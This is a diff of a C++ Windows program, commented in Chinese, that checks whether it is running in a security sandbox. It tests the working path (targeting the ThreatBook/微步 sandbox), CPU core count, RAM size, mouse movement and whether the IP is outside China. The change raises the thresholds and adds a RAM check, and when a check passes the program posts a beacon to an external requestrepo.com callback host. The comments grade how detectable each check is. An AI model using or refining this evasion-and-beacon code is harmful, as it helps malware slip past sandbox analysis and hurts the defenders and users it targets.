@@ -1,6 +1,6 @@
 #include "header.h"
 
-//微步
+//检测微步释放路径
 std::string workingdir()
 {
     char buf[256];
@@ -62,17 +62,28 @@ bool check_time() {
         return false;
     }
 }
+//CPU核心数为中敏感方法，可抛弃
 bool check_cpu() {
     SYSTEM_INFO systemInfo;
     GetSystemInfo(&systemInfo);
     DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
-    if (numberOfProcessors < 4) {
+    //建议设置6及以上
+    if (numberOfProcessors < 6) {
         return false;
     }
     else {
         return true;
     }
 }
+//ram内存大小为低敏感方法
+bool check_ram() {
+    MEMORYSTATUSEX memoryStatus;
+    memoryStatus.dwLength = sizeof(memoryStatus);
+    GlobalMemoryStatusEx(&memoryStatus);
+    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+    return (RAMMB >= 8192);
+}
+//判断是否非中国ip
 bool check_ip() {
     auto url = "http://ip-api.com";
     httplib::Client cli(url);
@@ -97,6 +108,7 @@ bool check_ip() {
         return false;
     }
 }
+//判断鼠标
 double distance(POINT p1, POINT p2) {
     double dx = p2.x - p1.x;
     double dy = p2.y - p1.y;
@@ -122,11 +134,11 @@ bool check_mouse() {
 }
 int main() {
     //用于提示已经成功执行
-    if (check_time()) {
+    if (check_ram()) {
         auto url = "ul6u2p5x.requestrepo.com";
         httplib::Client cli(url);
         httplib::Params p;
-        p.emplace("weibu", "true");
+        p.emplace("success", "true");
         auto res = cli.Post("/", p);
         MessageBoxA(NULL, "SUCCESS", "SUCCESS", NULL);
     }
